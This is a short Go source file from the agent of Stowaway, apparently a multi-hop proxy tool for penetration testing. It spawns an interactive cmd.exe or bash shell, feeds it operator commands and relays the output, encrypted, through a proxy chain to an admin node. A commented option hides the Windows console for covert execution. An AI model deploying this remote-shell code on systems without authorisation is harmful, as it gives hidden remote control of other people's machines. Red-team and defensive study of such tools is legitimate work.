package agent

import (
	"io"
	"os/exec"
	"runtime"
	//"syscall"

	"Stowaway/utils"
)

// CreatInteractiveShell 创建交互式shell
func CreatInteractiveShell() (io.Reader, io.Writer, error) {
	var cmd *exec.Cmd
	//判断操作系统后决定启动哪一种shell
	switch utils.CheckSystem() {
	case 0x01:
		cmd = exec.Command("c:\\windows\\system32\\cmd.exe")
		// cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}	//如果不想在windows上隐蔽执行时弹出cmd，去除注释
	default:
		cmd = exec.Command("/bin/sh", "-i")
		if runtime.GOARCH == "386" || runtime.GOARCH == "amd64" {
			cmd = exec.Command("/bin/bash", "-i")
		}
	}

	stdout, _ := cmd.StdoutPipe()

	stdin, _ := cmd.StdinPipe()

	cmd.Stderr = cmd.Stdout //将stderr重定向至stdout
	err := cmd.Start()

	return stdout, stdin, err
}

// StartShell 启动shell
func StartShell(command string, stdin io.Writer, stdout io.Reader, currentid string) {
	buf := make([]byte, 1024)
	stdin.Write([]byte(command))

	for {
		count, err := stdout.Read(buf)

		if err != nil {
			return
		}

		respShell, _ := utils.ConstructPayload(utils.AdminId, "", "DATA", "SHELLRESP", " ", string(buf[:count]), 0, currentid, AgentStatus.AESKey, false)
		AgentStuff.ProxyChan.ProxyChanToUpperNode <- respShell
	}
}
